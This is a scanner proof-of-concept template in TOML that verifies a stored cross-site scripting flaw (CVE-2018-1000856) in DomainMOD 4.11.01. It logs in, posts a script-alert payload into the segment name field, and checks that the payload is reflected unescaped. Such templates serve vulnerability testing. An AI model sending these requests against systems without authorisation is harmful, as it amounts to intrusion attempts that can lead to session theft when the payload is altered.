[info]
author = "ave"
description = "验证 DomainMOD segments/add.php Segment Name 字段是否存在存储型 XSS 漏洞"
id = "POC-AVE-2018-0028"
name = "DomainMOD 4.11.01 - Cross-Site Scripting PoC"
severity = "medium"
tags = ["ave-2018-0028"]
vuln_id = [
    "CVE-2018-1000856",
    "AVE-2018-0028",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}"
protocol = "http"

[poc.requests.body]
content = "new_username={{username}}&new_password={{password}}"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/segments/add.php"
protocol = "http"

[poc.requests.body]
content = "new_name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&raw_domain_list=test.com&new_description=test&new_notes=test"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/segments/"
protocol = "http"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert(1)</script></a>"]

[[poc.requests.matchers]]
expect = true
part = "header"
type = "word"
words = ["text/html"]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
